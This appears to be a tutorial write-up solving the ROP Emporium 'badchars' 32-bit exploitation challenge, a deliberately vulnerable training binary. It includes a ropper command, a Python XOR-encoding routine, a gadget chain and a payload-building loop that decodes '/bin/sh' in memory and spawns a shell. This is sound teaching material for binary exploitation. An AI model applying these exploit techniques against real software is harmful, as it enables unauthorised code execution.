# badchars - 32bit

When running the program the set of bad characters is present to us:

```
badchars by ROP Emporium
32bits

badchars are: b i c / <space> f n s
> 
```

So, in this case, we cannot just place `/bin/sh` into memory and call it as the characters will be muddled.

Note: `ropper` has a mode to return gadgets that do not contain the specified bad characters:

```
ropper -f badchars32 -b "626963666e73202f"
```

Therefore, we need to prepare the string to pass the check. Then we need to alter the string while it is present in memory.

We first need to XOR the string a find a single value that gives us a string that contains no badchars

The function below achieves this purpose:

```python
def find_valid_string_with_XOR(originalString):

    FOUND_SOLUTION = False

    xor_value = 0

    while not FOUND_SOLUTION:
        xor_value += 1
        newString = ""

        for o in originalString:
            newChar = chr(ord(o) ^ xor_value)
            
            if newChar in badchars:
                break

            newString += newChar

        else:
            FOUND_SOLUTION = True
        

    return newString, xor_value
```

For example the function will translate `/bin/sh` to `-``kl-qj` with an XOR value of `0x02`.

We then write the XORed string into memory in exactly the same way as `write4`.

The gadgets chain:

```
# C1
pop esi 
pop edi 
ret 
<STRING>
<.DATA_ADDRESS>
<C2_ADDRESS>

# C2
mov dword ptr [edi], esi
ret
```

Will write four bytes of a string into memory, this needs to repeated twice for each 4-byte chunk of the string.

Now, we need to alter the data on the stack to recreate the `/bin/sh\x00` string.

The perfect gadget is present in the binary:

```
xor byte ptr [ebx], cl ; ret
```

This will xor the first byte of the data present in `ebx`. This means we can increment the value in `ebx` and gradually XOR each character.

This combined with the `pop ebx ; pop ecx ; ret` gadget lets us place values into the correct areas.

The code below achieves this functionality:

```python
data_addr = 0x804a088 # .data
for o in command:
    payload += pop_bx_cx        # pop ebx ; pop ecx ; ret
    payload += p32(data_addr)   # Address of .data 
    payload += p32(xor_value)   # 0x02 (From the XOR code above)
    payload += xor_gad          # xor byte ptr [ebx], cl ; ret)

    data_addr += 1
```

This gadget chain will turn out string back to `/bin/sh`!

This exploit is finished with a tasty call to system to spawn a shell.